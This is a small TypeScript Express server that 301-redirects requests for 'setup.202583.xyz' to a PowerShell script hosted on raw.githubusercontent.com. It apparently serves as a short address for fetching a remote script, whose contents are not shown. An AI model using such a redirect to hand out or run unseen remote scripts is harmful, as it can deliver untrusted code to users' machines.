import express, { Request, Response, NextFunction } from 'express';

const app = express();

// The target URL to redirect to
const redirectUrl: string = 'https://raw.githubusercontent.com/rh609/setup/refs/heads/main/zawgers.ps1';

// Middleware to check for the subdomain and redirect
app.use((req: Request, res: Response, next: NextFunction) => {
  const host: string = req.headers.host || '';

  // Check if the request is for the specific subdomain
  if (host === 'setup.202583.xyz') {
    // Redirect with 301 status code
    return res.redirect(301, redirectUrl);
  }
  
  // If the subdomain doesn't match, continue with the request
  next();
});

// Start the server on port 80 (HTTP)
app.listen(80, () => {
  console.log('Server is running on http://setup.202583.xyz');
});
